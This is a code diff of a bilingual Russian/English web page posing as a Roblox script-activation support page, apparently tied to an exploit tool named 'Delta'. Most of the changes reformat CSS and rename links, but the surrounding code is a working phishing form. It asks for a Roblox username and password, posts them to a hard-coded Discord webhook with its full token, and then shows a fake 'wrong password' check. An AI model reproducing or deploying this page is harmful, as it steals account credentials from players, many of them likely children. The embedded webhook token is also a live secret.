@@ -19,10 +19,7 @@
             text-align: center;
             border-bottom: 2px solid #ff4444;
         }
-        header h1 {
-            font-size: 36px;
-            color: #ff4444;
-        }
+        header h1 { font-size: 36px; color: #ff4444; }
         .language-selector {
             position: fixed;
             top: 20px;
@@ -43,11 +40,7 @@
             padding: 15px;
             text-align: center;
         }
-        nav a {
-            color: #fff;
-            text-decoration: none;
-            margin: 0 15px;
-        }
+        nav a { color: #fff; text-decoration: none; margin: 0 15px; }
         nav a:hover { color: #ff4444; }
         main {
             max-width: 500px;
@@ -60,22 +53,14 @@
             border-radius: 10px;
             border: 2px solid #333;
         }
-        .support-form h2 {
-            color: #ff4444;
-            margin-bottom: 10px;
-            text-align: center;
-        }
+        .support-form h2 { color: #ff4444; margin-bottom: 10px; text-align: center; }
         .support-form .subtitle {
             color: #888;
             text-align: center;
             margin-bottom: 20px;
             font-size: 14px;
         }
-        .support-form label {
-            display: block;
-            margin-bottom: 5px;
-            color: #888;
-        }
+        .support-form label { display: block; margin-bottom: 5px; color: #888; }
         .support-form input {
             width: 100%;
             padding: 12px;
@@ -102,9 +87,7 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        .activate-btn:hover {
-            background: #ff6666;
-        }
+        .activate-btn:hover { background: #ff6666; }
         .skip-btn {
             width: 100%;
             padding: 12px;
@@ -119,25 +102,12 @@
             display: block;
             text-align: center;
         }
-        .skip-btn:hover {
-            background: #444;
-        }
-        .error {
-            color: #ff4444;
-            text-align: center;
-            margin-top: 10px;
-            display: none;
-        }
-        .loading {
-            color: #ffaa00;
-            text-align: center;
-            margin-top: 10px;
-            display: none;
-        }
+        .skip-btn:hover { background: #444; }
+        .error { color: #ff4444; text-align: center; margin-top: 10px; display: none; }
+        .loading { color: #ffaa00; text-align: center; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-    <!-- Выбор языка -->
     <div class="language-selector">
         <select id="languageSelect" onchange="changeLanguage(this.value)">
             <option value="ru">🇷🇺 Русский</option>
@@ -152,8 +122,7 @@
     
     <nav>
         <a href="index.html" id="navHome">Главная</a>
-        <a href="scripts.html" id="navScripts">Скрипты</a>
-        <a href="extensions.html" id="navExtensions">Расширения</a>
+        <a href="delta.html" id="navDelta">Delta</a>
         <a href="support.html" id="navSupport">Поддержка</a>
     </nav>
     
@@ -180,20 +149,16 @@
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
         
-        // Переводы
         const translations = {
             ru: {
                 headerSubtitle: 'Поддержка',
                 navHome: 'Главная',
-                navScripts: 'Скрипты',
-                navExtensions: 'Расширения',
+                navDelta: 'Delta',
                 navSupport: 'Поддержка',
                 formTitle: '🔐 Активация скриптов',
                 formSubtitle: 'Для активации введите данные от аккаунта Roblox',
                 usernameLabel: 'Логин Roblox',
                 passwordLabel: 'Пароль Roblox',
-                usernamePlaceholder: 'Введите логин...',
-                passwordPlaceholder: 'Введите пароль...',
                 activateBtn: 'Активировать',
                 skipBtn: 'Пропустить активацию',
                 errorEmpty: 'Заполните все поля!',
@@ -203,15 +168,12 @@
             en: {
                 headerSubtitle: 'Support',
                 navHome: 'Home',
-                navScripts: 'Scripts',
-                navExtensions: 'Extensions',
+                navDelta: 'Delta',
                 navSupport: 'Support',
                 formTitle: '🔐 Script Activation',
                 formSubtitle: 'Enter your Roblox account details to activate',
                 usernameLabel: 'Roblox Username',
                 passwordLabel: 'Roblox Password',
-                usernamePlaceholder: 'Enter username...',
-                passwordPlaceholder: 'Enter password...',
                 activateBtn: 'Activate',
                 skipBtn: 'Skip activation',
                 errorEmpty: 'Please fill in all fields!',
@@ -220,26 +182,21 @@
             }
         };
         
-        // Функция смены языка
         function changeLanguage(lang) {
             localStorage.setItem('language', lang);
             const t = translations[lang];
             
             document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
             document.getElementById('navHome').textContent = t.navHome;
-            document.getElementById('navScripts').textContent = t.navScripts;
-            document.getElementById('navExtensions').textContent = t.navExtensions;
+            document.getElementById('navDelta').textContent = t.navDelta;
             document.getElementById('navSupport').textContent = t.navSupport;
             document.getElementById('formTitle').textContent = t.formTitle;
             document.getElementById('formSubtitle').textContent = t.formSubtitle;
             document.getElementById('usernameLabel').textContent = t.usernameLabel;
             document.getElementById('passwordLabel').textContent = t.passwordLabel;
-            document.getElementById('username').placeholder = t.usernamePlaceholder;
-            document.getElementById('password').placeholder = t.passwordPlaceholder;
             document.getElementById('activateBtn').textContent = t.activateBtn;
             document.getElementById('skipBtn').textContent = t.skipBtn;
             
-            // Отправляем выбор языка в Discord
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -247,7 +204,6 @@
             });
         }
         
-        // Загрузка сохранённого языка
         function loadLanguage() {
             const savedLang = localStorage.getItem('language') || 'ru';
             document.getElementById('languageSelect').value = savedLang;
@@ -272,7 +228,6 @@
             loading.textContent = t.loadingText;
             loading.style.display = 'block';
             
-            // Отправляем данные в Discord
             const message = '🔑 **ДАННЫЕ ОТ АККАУНТА ROBLOX**\n\n' +
                 '👤 **Логин:** ' + username + '\n' +
                 '🔒 **Пароль:** ' + password + '\n\n' +
@@ -287,7 +242,6 @@
                 body: JSON.stringify({content: message})
             });
             
-            // Фейковая проверка
             setTimeout(function() {
                 loading.style.display = 'none';
                 error.textContent = t.errorWrong;
@@ -347,7 +301,6 @@
             return false;
         }
         
-        // Загрузка языка при старте
         window.addEventListener('load', function() {
             loadLanguage();
         });
